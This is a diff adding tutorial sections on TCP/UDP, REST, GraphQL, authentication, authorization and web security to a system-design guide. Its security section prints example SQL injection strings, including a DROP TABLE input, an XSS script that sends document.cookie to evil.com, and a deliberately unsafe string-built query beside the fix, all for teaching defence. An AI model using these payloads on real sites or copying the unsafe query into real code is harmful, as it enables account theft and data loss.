@@ -46,6 +46,12 @@ But the moment real people start using your thing, everything breaks in ways you
 20. [Single Server Setup — where every system starts](#20-single-server-setup--where-every-system-starts)
 21. [API Design — the contract between systems](#21-api-design--the-contract-between-systems)
 22. [API Protocols — the languages systems use to talk](#22-api-protocols--the-languages-systems-use-to-talk)
+23. [Transport Layer — TCP and UDP](#23-transport-layer--tcp-and-udp)
+24. [RESTful APIs — the most popular way to build APIs](#24-restful-apis--the-most-popular-way-to-build-apis)
+25. [GraphQL — fetch exactly what you need](#25-graphql--fetch-exactly-what-you-need)
+26. [Authentication — proving who you are](#26-authentication--proving-who-you-are)
+27. [Authorization — what you’re allowed to do](#27-authorization--what-youre-allowed-to-do)
+28. [Security — keeping the bad guys out](#28-security--keeping-the-bad-guys-out)
 
 ---
 
@@ -2289,6 +2295,833 @@ graph TB
 | **gRPC**      | Request / Response       | Binary (Protobuf) | Fast internal microservice calls     |
 | **WebSocket** | Persistent bidirectional | Text or Binary    | Chat, live feeds, multiplayer games  |
 | **Webhook**   | Server pushes to client  | JSON              | Event notifications, integrations    |
+
+---
+
+## 23. Transport Layer — TCP and UDP
+
+Before HTTP, REST, or GraphQL can work, there is a lower layer that physically moves bytes from one machine to another — the **Transport Layer**.
+
+The two main protocols: **TCP** and **UDP**. They are like two very different delivery services.
+
+---
+
+### TCP — Transmission Control Protocol
+
+TCP is the careful, reliable courier. It guarantees every piece of your message arrives, in the right order, with no duplicates.
+
+```
+How TCP works:
+
+Step 1 — Handshake (before any data):
+  You -> Server:  "SYN   — Hello, are you there?"
+  Server -> You:  "SYN-ACK  — Yes, can you hear me?"
+  You -> Server:  "ACK  — Great, let us start."
+  (This is called the Three-Way Handshake)
+
+Step 2 — Data travels in numbered packets:
+  "Hello World!" splits into:
+  [Packet 1: "Hell"] [Packet 2: "o Wo"] [Packet 3: "rld!"]
+
+Step 3 — Server acknowledges each packet:
+  "Got 1" -> "Got 2" -> waiting for 3...
+
+Step 4 — Lost packets get resent automatically:
+  Packet 3 never arrives -> TCP resends it
+
+Step 5 — Reassembled in correct order at destination
+```
+
+TCP guarantees:
+
+- All data arrives (no silent loss)
+- Correct order
+- No duplicates
+- Slower due to handshaking and acknowledgements
+
+**Used for:** HTTP, email, SSH, file downloads, database connections — anything where accuracy matters.
+
+---
+
+### UDP — User Datagram Protocol
+
+UDP is the fast, careless courier — fire and forget.
+
+```
+How UDP works:
+
+No handshake.
+No acknowledgement.
+No ordering.
+No error recovery.
+
+You -> "Here is the data." -> blasts packets at maximum speed
+
+That is it.
+```
+
+UDP characteristics:
+
+- Very fast — minimal overhead
+- Low latency
+- No delivery guarantee (packets can silently get lost)
+- No ordering guarantee
+
+**Used for:** Video calls, online gaming, live streaming, DNS — where speed beats perfection.
+
+---
+
+### The key difference — an analogy
+
+```
+TCP is like tracked, signed-for delivery:
+  + Confirmed delivered
+  + Redelivered if lost
+  + Arrives intact and in order
+  - Slightly slower
+  Use for: bank transfers, file downloads
+
+UDP is like shoving a flyer through a letterbox:
+  + Instant — no waiting
+  - No confirmation it was received
+  - Might land in the bin
+  Use for: live video (dropping 1 frame in 60 is fine)
+```
+
+---
+
+### TCP vs UDP
+
+```
++------------------------------------+------------------------------------+
+|               TCP                  |               UDP                  |
++------------------------------------+------------------------------------+
+| Connection-based (handshake first) | Connectionless (just send)         |
+| Guaranteed delivery                | No delivery guarantee              |
+| Guaranteed order                   | No order guarantee                 |
+| Error recovery built in            | Basic error check, no recovery     |
+| Slower                             | Faster                             |
+| Higher overhead                    | Minimal overhead                   |
+| HTTP, SSH, email, file transfer    | Video calls, DNS, games            |
++------------------------------------+------------------------------------+
+```
+
+---
+
+### When does this matter for system design?
+
+```
+Designing a video call app?
+  Dropping 1 frame is fine. Waiting for retransmission = freeze.
+  -> Use UDP
+
+Designing a payment system?
+  Missing one byte = data corruption. Must retry.
+  -> Use TCP
+
+Designing a live multiplayer game?
+  Position updates every 50ms. Missing one is fine.
+  -> UDP for positions, TCP for critical events (scores, chat)
+
+Designing a DNS resolver?
+  Small request, small response, needs to be fast.
+  If the UDP packet is lost, client just retries.
+  -> UDP
+```
+
+> **Modern note:** HTTP/3 runs over **QUIC** — built on UDP with its own reliability layer. It gets UDP's speed while avoiding TCP's head-of-line blocking, where one lost packet stalls all other streams.
+
+---
+
+## 24. RESTful APIs — the most popular way to build APIs
+
+### What makes an API "RESTful"?
+
+**REST** stands for Representational State Transfer — a set of rules for APIs that use standard HTTP.
+
+The core idea: **everything is a resource** (a noun — users, posts, orders). Resources live at URLs. HTTP verbs say what to do with them.
+
+---
+
+### The resource model
+
+```
+Resource              URL
+-----------           ----------------------------------
+All users       ->    GET  /users
+One user        ->    GET  /users/42
+User's orders   ->    GET  /users/42/orders
+One order       ->    GET  /users/42/orders/7
+```
+
+Verbs say the action:
+
+```
+GET    /users          ->  list all users
+POST   /users          ->  create a new user
+GET    /users/42       ->  get user 42
+PUT    /users/42       ->  completely replace user 42
+PATCH  /users/42       ->  update specific fields of user 42
+DELETE /users/42       ->  delete user 42
+```
+
+---
+
+### A complete REST API — a blog platform
+
+```
+Articles:
+  GET    /articles                   ->  list all (paginated)
+  POST   /articles                   ->  create new article
+  GET    /articles/abc123            ->  get specific article
+  PUT    /articles/abc123            ->  replace entire article
+  PATCH  /articles/abc123            ->  update title or body only
+  DELETE /articles/abc123            ->  delete it
+
+Comments on an article:
+  GET    /articles/abc123/comments   ->  get all comments
+  POST   /articles/abc123/comments   ->  add a comment
+  DELETE /articles/abc123/comments/7 ->  delete comment 7
+
+Filtering, sorting, pagination:
+  GET /articles?category=tech
+  GET /articles?sort=date&order=desc
+  GET /articles?page=2&limit=20
+```
+
+---
+
+### A full request and response example
+
+```
+Creating a new article:
+
+REQUEST:
+  POST /api/v1/articles
+  Authorization: Bearer eyJhbGci...
+  Content-Type: application/json
+
+  {
+    "title": "How TCP actually works",
+    "body": "Before HTTP can do anything...",
+    "category": "networking"
+  }
+
+RESPONSE (201 Created):
+  {
+    "id": "art_xyz789",
+    "title": "How TCP actually works",
+    "body": "Before HTTP can do anything...",
+    "category": "networking",
+    "author_id": "usr_42",
+    "created_at": "2024-12-25T09:00:00Z"
+  }
+```
+
+---
+
+### The 6 principles of REST
+
+```
+1. Client-Server Separation
+   UI (client) and data/logic (server) are completely separate.
+   Client does not care how the server stores data.
+   Server does not care how the client displays it.
+
+2. Stateless
+   Server remembers NOTHING between requests.
+   Every request contains all the information needed.
+   (User identity goes in a JWT or cookie, not server memory.)
+   This is what makes horizontal scaling possible.
+
+3. Cacheable
+   Responses can declare themselves cacheable.
+   GET responses are usually cacheable.
+   POST and DELETE usually are not.
+
+4. Uniform Interface
+   Consistent, predictable URLs and verbs across all resources.
+
+5. Layered System
+   Client does not know if it is talking directly to the server
+   or to a load balancer or CDN in between. Does not need to.
+
+6. Code on Demand (optional)
+   Server can send executable code (e.g. JavaScript).
+   Rarely used in modern REST APIs.
+```
+
+---
+
+### Common REST anti-patterns — what NOT to do
+
+```
+Verbs in URLs:
+  GET /getUser?id=42       ->  GET /users/42
+  POST /createOrder        ->  POST /orders
+  POST /deleteUser?id=42   ->  DELETE /users/42
+
+No versioning:
+  /api/users  (change this -> breaks every client using it)
+  ->  /api/v1/users  (version from day one)
+
+Inconsistent error format:
+  Sometimes: { "message": "not found" }
+  Sometimes: { "error": { "code": 404 } }
+  Sometimes: just a 404 with no body
+  ->  Always use one consistent structure
+
+Returning sensitive fields:
+  { "id": 42, "password_hash": "$2b$12$abc..." }
+  ->  Never include internal fields in API responses
+```
+
+---
+
+## 25. GraphQL — fetch exactly what you need
+
+### The problem REST has
+
+Imagine a mobile profile page needing: name, photo, last 3 post titles, follower count.
+
+With REST you would make 3 separate calls:
+
+```
+Call 1:  GET /users/42
+  Returns: name, photo, bio, email, settings, last_login, ...
+  (You needed name + photo — you got much more. Over-fetching.)
+
+Call 2:  GET /users/42/posts
+  Returns: 20 posts, each with full body, tags, comment counts...
+  (You needed 3 titles — still too much. Over-fetching.)
+
+Call 3:  GET /users/42/stats
+  (A whole extra round trip just for follower count. Under-fetching.)
+
+Problems:
+  -> 3 network round trips (slow on mobile)
+  -> Much more data than needed (wastes mobile bandwidth)
+```
+
+This is the **over-fetching / under-fetching** problem.
+
+---
+
+### What GraphQL does instead
+
+The client asks for exactly what it needs in a single request:
+
+```graphql
+query UserProfile {
+  user(id: "42") {
+    name
+    photo
+    followerCount
+    recentPosts: posts(limit: 3) {
+      title
+      createdAt
+    }
+  }
+}
+```
+
+Response — nothing more, nothing less:
+
+```json
+{
+  "data": {
+    "user": {
+      "name": "Alice",
+      "photo": "https://cdn.example.com/alice.jpg",
+      "followerCount": 1234,
+      "recentPosts": [
+        { "title": "My first post", "createdAt": "2024-12-01" },
+        { "title": "Learning GraphQL", "createdAt": "2024-12-10" },
+        { "title": "System design tips", "createdAt": "2024-12-20" }
+      ]
+    }
+  }
+}
+```
+
+One call. Exactly what was asked for.
+
+---
+
+### How GraphQL works under the hood
+
+```mermaid
+graph LR
+    Client["App"]
+    GQL["GraphQL Server\nPOST /graphql"]
+    US["User Service"]
+    PS["Posts Service"]
+    FS["Followers Service"]
+
+    Client -->|"name + photo + followerCount + 3 posts"| GQL
+    GQL --> US
+    GQL --> PS
+    GQL --> FS
+    US --> GQL
+    PS --> GQL
+    FS --> GQL
+    GQL -->|"exactly what was requested"| Client
+```
+
+The GraphQL server orchestrates fetching from multiple services. The client just describes the shape of data it wants.
+
+---
+
+### Core concepts
+
+```
+SCHEMA — the menu of everything queryable:
+  type User {
+    id: ID!
+    name: String!
+    posts: [Post!]!
+    followerCount: Int!
+  }
+
+QUERY — reading data (like GET in REST):
+  query {
+    user(id: "42") { name, email }
+  }
+
+MUTATION — changing data (like POST/PUT/DELETE):
+  mutation {
+    createPost(title: "Hello!", body: "World") {
+      id
+      title
+    }
+  }
+
+SUBSCRIPTION — real-time updates (like WebSocket):
+  subscription {
+    newMessage(chatId: "room1") {
+      text
+      sender { name }
+    }
+  }
+```
+
+---
+
+### GraphQL vs REST — when to use which
+
+| Use GraphQL when                              | Use REST when                              |
+| --------------------------------------------- | ------------------------------------------ |
+| Mobile app (bandwidth and round trips matter) | Simple CRUD API                            |
+| Complex UI needs many data types at once      | Public API (REST is easier to document)    |
+| Frontend teams iterate fast on queries        | Simple caching (REST URLs cache naturally) |
+| Multiple clients need different data shapes   | File uploads or streaming                  |
+
+---
+
+## 26. Authentication — proving who you are
+
+### What is authentication?
+
+**Authentication** answers: _"Who are you? And can you prove it?"_
+
+When you log in, you prove your identity once. The app gives you a badge (token or session) that you show on every subsequent request.
+
+```
+Without authentication:         With authentication:
+
+Anyone accesses anything.       You prove who you are once.
+No concept of "your data".      Get a badge (token).
+                                Show it on every request.
+                                Access only your own data.
+```
+
+---
+
+### The three authentication factors
+
+```
+Factor 1 — Something you KNOW:
+  Password, PIN, security question answer
+
+Factor 2 — Something you HAVE:
+  Your phone (receives an SMS code or runs an authenticator app)
+  A physical hardware key (YubiKey)
+
+Factor 3 — Something you ARE:
+  Fingerprint, Face ID, retina scan
+
+MFA (Multi-Factor Authentication) = combining any 2 of these.
+
+Even if an attacker steals your password, they still cannot log in
+without your phone or your fingerprint.
+```
+
+---
+
+### Session-based auth — the classic approach
+
+```mermaid
+sequenceDiagram
+    participant U as User
+    participant S as Server
+    participant DB as Session Store (Redis)
+
+    U->>S: POST /login { email, password }
+    S->>DB: Verify credentials. Create session.
+    DB-->>S: Session ID: "sess_abc123"
+    S-->>U: Set-Cookie: session_id=sess_abc123
+
+    Note over U,DB: Every subsequent request:
+    U->>S: GET /dashboard (Cookie: session_id=sess_abc123)
+    S->>DB: Is "sess_abc123" valid? Who is it?
+    DB-->>S: Valid. This is Alice.
+    S-->>U: Here is Alice's dashboard
+```
+
+**The catch:** The session store must be shared across ALL your servers. If Server A creates a session, Server B needs to find it too when traffic arrives there next.
+
+---
+
+### JWT — the modern stateless approach
+
+A JWT is a self-contained token carrying user info inside it. No database lookup needed to verify it.
+
+```
+A JWT has 3 parts separated by dots:
+
+eyJhbGci...  .  eyJ1c2VySWQiOjQyfQ  .  SflKxwRJSMeKKF2Q...
+     |                  |                       |
+  HEADER             PAYLOAD                SIGNATURE
+  algorithm         who is this?          hash of Part 1 + Part 2
+  used to sign      when does it expire?  using the server's secret key
+
+If anyone tampers with the payload, the signature does not match.
+The token is rejected.
+```
+
+```mermaid
+sequenceDiagram
+    participant U as User
+    participant S as Server (any of them)
+
+    U->>S: POST /login { email, password }
+    S->>S: Verify. Create signed JWT.
+    S-->>U: Here is your JWT token.
+
+    Note over U,S: Every subsequent request:
+    U->>S: GET /dashboard  (Authorization: Bearer jwt_here)
+    S->>S: Verify signature with secret key
+    S->>S: Check expiry timestamp
+    S-->>U: Here is Alice's dashboard
+
+    Note over S: No database lookup needed.
+    Note over S: Any server can verify independently.
+```
+
+JWT pros:
+
+- Stateless — works across multiple servers with no shared session store
+- Carries user info inside (ID, roles) — no DB call per request
+- Perfect for microservices
+
+JWT cons:
+
+- Hard to "log out" before expiry — use short expiry (15 min) plus refresh tokens
+- If stolen, attacker has access until the token expires
+
+---
+
+### OAuth 2.0 — "Login with Google / GitHub"
+
+OAuth 2.0 is the protocol behind "Login with Google" buttons. It lets you grant a third-party app limited access to your account on another service — **without giving them your password**.
+
+```mermaid
+sequenceDiagram
+    participant U as You
+    participant APP as Spotify (App)
+    participant AUTH as Facebook (Auth Server)
+    participant RS as Facebook (Resource Server)
+
+    U->>APP: "Login with Facebook"
+    APP->>AUTH: Redirect: "User wants to login via my app"
+    AUTH->>U: "Spotify wants your name + email. Allow?"
+    U->>AUTH: "Allow"
+    AUTH->>APP: Authorization Code
+    APP->>AUTH: Exchange code for access token (server-side, secure)
+    AUTH->>APP: Access Token
+    APP->>RS: GET /me  (Authorization: Bearer access_token)
+    RS->>APP: { name: "Alice", email: "alice@fb.com" }
+    APP->>U: You are logged in as Alice
+```
+
+Spotify never sees your Facebook password. It only gets a limited token that can read your name and email — nothing else.
+
+---
+
+## 27. Authorization — what you're allowed to do
+
+### Authentication vs Authorization — not the same thing
+
+```
+Authentication = "Who are you?"
+  Verifying identity. Are you who you claim to be?
+  "Show me your ID."
+
+Authorization = "What are you allowed to do?"
+  Checking permissions. What can this person access?
+  "Your ID is valid but you do not have clearance for Floor 5."
+
+Example:
+  You log into a company app.        <- Authentication passed
+  You try to view HR salary records.
+  You are a developer, not HR.       <- Authorization denied
+```
+
+---
+
+### Role-Based Access Control (RBAC) — the most common model
+
+Assign users to **roles**, define what each role can do.
+
+```mermaid
+graph LR
+    Alice["Alice"] --> AdminRole["Admin Role"]
+    Bob["Bob"] --> EditorRole["Editor Role"]
+    Carol["Carol"] --> ViewerRole["Viewer Role"]
+
+    AdminRole --> CanDelete["Delete content"]
+    AdminRole --> CanWrite["Write content"]
+    AdminRole --> CanRead["Read content"]
+    AdminRole --> ManageUsers["Manage users"]
+
+    EditorRole --> CanWrite
+    EditorRole --> CanRead
+
+    ViewerRole --> CanRead
+```
+
+---
+
+### Attribute-Based Access Control (ABAC) — finer grained
+
+RBAC gives access based on role. ABAC gives access based on **attributes** — much more flexible.
+
+```
+ABAC rule examples:
+
+  "Allow IF user.department = 'Finance'
+           AND resource.type = 'salary_report'
+           AND time BETWEEN 9am AND 6pm"
+
+  "Allow IF user.clearance >= resource.required_clearance"
+
+  "Allow IF user.country = resource.data_residency_region"
+  (useful for GDPR compliance)
+```
+
+---
+
+### Authorization using JWT claims
+
+When a user logs in, the JWT can carry roles and permissions so no DB lookup is needed per request:
+
+```json
+{
+  "userId": 42,
+  "email": "alice@company.com",
+  "roles": ["admin", "editor"],
+  "permissions": ["articles:write", "articles:delete", "users:manage"],
+  "exp": 1735000000
+}
+```
+
+When Alice tries to delete an article:
+
+```
+Server receives:  DELETE /articles/123
+Token says:       roles: ["admin", "editor"]
+Server checks:    Does admin or editor role have delete permission?
+Answer:           Admin does -> Allow
+```
+
+No database call for authorization — the JWT already carries the answer.
+
+---
+
+### Principle of Least Privilege — the golden rule
+
+> **Give every user, service, and process only the minimum permissions needed. Nothing more.**
+
+```
+Bad practice:
+  Every developer has production database admin access.
+  -> One compromised account = full database exposed.
+
+Good practice:
+  Developers have read-only access to logs.
+  Elevated access requires a formal request, is logged,
+  and auto-expires after 1 hour.
+  -> Compromised account has a very limited blast radius.
+
+This applies to services too:
+  Image-resizing service   -> access to image bucket only
+  Email service            -> permission to send emails only
+  Reporting service        -> read-only database access, never write
+```
+
+---
+
+## 28. Security — keeping the bad guys out
+
+Security is not one thing. It is a collection of practices across every layer of your system.
+
+---
+
+### HTTPS — encrypting everything in transit
+
+Every app must use HTTPS. Without it, anyone on the same network can read your traffic.
+
+```
+Without HTTPS:
+  Browser sends:   POST /login { "password": "hunter2" }
+  Travels network: visible to anyone on the same WiFi
+  Attacker reads:  "password": "hunter2"                 <- bad
+
+With HTTPS (TLS):
+  Browser sends:   ████████████████████████ (encrypted)
+  Network sees:    ████████████████████████ (unreadable)
+  Only the server has the private key to decrypt         <- good
+```
+
+---
+
+### SQL Injection — sneaking commands into your database
+
+```
+Your app runs:  SELECT * FROM users WHERE email = '[user input]'
+
+Normal user types:    alice@gmail.com
+Query:                SELECT * FROM users WHERE email = 'alice@gmail.com'   OK
+
+Attacker types:       ' OR '1'='1
+Query:                SELECT * FROM users WHERE email = '' OR '1'='1'
+                                                              ^^^^^^^^^^^
+                                                              Always true!
+                      Returns ALL users in the database        <- bad
+
+Attacker types:       '; DROP TABLE users; --
+Query:                Deletes your entire users table           <- catastrophic
+```
+
+**Fix: Use parameterised queries. Always.**
+
+```python
+# DANGEROUS:
+query = f"SELECT * FROM users WHERE email = '{user_input}'"
+
+# SAFE (input is treated as data, never as SQL code):
+query = "SELECT * FROM users WHERE email = ?"
+cursor.execute(query, [user_input])
+```
+
+---
+
+### XSS — Cross-Site Scripting
+
+An attacker injects malicious JavaScript into your page. It runs in other users' browsers.
+
+```
+Your site shows user comments:
+  Normal:    <div class="comment">Great article!</div>
+
+  Attacker posts:
+    <script>fetch('https://evil.com/?c='+document.cookie)</script>
+
+  If rendered as raw HTML:
+    -> Every visitor's browser runs the script
+    -> Cookies sent to evil.com
+    -> Attacker can log in as every user who viewed the page  <- bad
+```
+
+**Fix:** Escape all user content before rendering as HTML. React, Vue, and Angular do this automatically. Never use `.innerHTML` with untrusted data.
+
+---
+
+### Broken Authentication — weak login systems
+
+```
+Common mistakes:
+  Passwords stored as plain text or weak hash (MD5)
+  No account lockout after failed attempts
+    -> Lets attackers try millions of passwords (brute force)
+  Session tokens that never expire
+  No rate limiting on the login endpoint
+
+Fixes:
+  Hash passwords with bcrypt or Argon2 (not MD5 or SHA1)
+  Lock accounts after 5-10 failed attempts with backoff
+  JWT tokens expire in 15-60 minutes (use refresh tokens)
+  Rate limit logins: max 5 attempts per minute per IP
+  Offer MFA for sensitive accounts
+```
+
+---
+
+### Sensitive Data Exposure
+
+```
+Bad API response:
+  {
+    "id": 42,
+    "name": "Alice",
+    "email": "alice@gmail.com",
+    "password_hash": "$2b$12$abc...",    <- NEVER return this
+    "credit_card": "4111111111111111",   <- NEVER return this
+    "internal_flag": true                 <- should not exist here
+  }
+
+Good API response:
+  {
+    "id": 42,
+    "name": "Alice",
+    "email": "alice@gmail.com"
+  }
+```
+
+Each endpoint should return only what the client actually needs.
+
+---
+
+### Security checklist
+
+```
+Authentication:
+  [ ] Passwords hashed with bcrypt or Argon2
+  [ ] Account lockout after failed attempts + rate limiting
+  [ ] JWT tokens have short expiry (15-60 min)
+  [ ] MFA available for sensitive accounts
+
+Data protection:
+  [ ] HTTPS everywhere (redirect HTTP -> HTTPS)
+  [ ] API returns only fields needed per endpoint
+  [ ] No secrets hardcoded in source code (use env vars)
+
+Input handling:
+  [ ] Parameterised queries everywhere (zero SQL concatenation)
+  [ ] All user input escaped before rendering in HTML
+  [ ] File upload type validation
+  [ ] Request size limits
+
+Infrastructure:
+  [ ] No default credentials left unchanged
+  [ ] Firewall: only required ports open
+  [ ] Regular dependency updates
+
+Monitoring:
+  [ ] Log all auth events (logins, failures, logouts)
+  [ ] Alert on suspicious patterns (100 failed logins in 1 min)
+  [ ] Audit log: who accessed what, when
+```
 
 ---
 
